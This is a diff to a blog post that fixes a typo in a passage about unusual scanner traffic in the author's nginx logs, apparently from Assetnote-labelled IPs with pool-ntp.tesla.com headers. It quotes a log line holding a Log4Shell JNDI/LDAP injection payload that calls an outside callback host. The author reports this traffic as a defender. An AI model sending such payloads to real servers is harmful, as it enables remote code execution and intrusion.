@@ -14,7 +14,7 @@ ntpuserinfo  html=ntpuserinfo.html gemini=ntpuserinfo.gmi gemini.col=25 gopher=n
 
 @end
 
-Whilet’s not unusual for everything on the dark dungeons of the IPv4 Internet to be subject to a barrage of drive-by scanner traffic and the occasional bizarrely persistent attacker, I noticed something strange while looking through my nginx logs. Persistent attack traffic coming from three particular IPs, with the strange thing being that they were arriving with `Host` or `Referer` headers from `pool-ntp.tesla.com`, carried Assetnote user agents, and were trying to SSRF me to Assetnote callback URLs:
+While it’s not unusual for everything on the dark dungeons of the IPv4 Internet to be subject to a barrage of drive-by scanner traffic and the occasional bizarrely persistent attacker, I noticed something strange while looking through my nginx logs. Persistent attack traffic coming from three particular IPs, with the strange thing being that they were arriving with `Host` or `Referer` headers from `pool-ntp.tesla.com`, carried Assetnote user agents, and were trying to SSRF me to Assetnote callback URLs:
 
 ```
 35.168.63.24 - - [13/Sep/2026:01:14:31 -0700] "GET /?a=%3Cscript%20src=${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}>alert()%3C%2Fscript%3E HTTP/1.1" 299 817 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 ${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}" host=pool-ntp.tesla.com
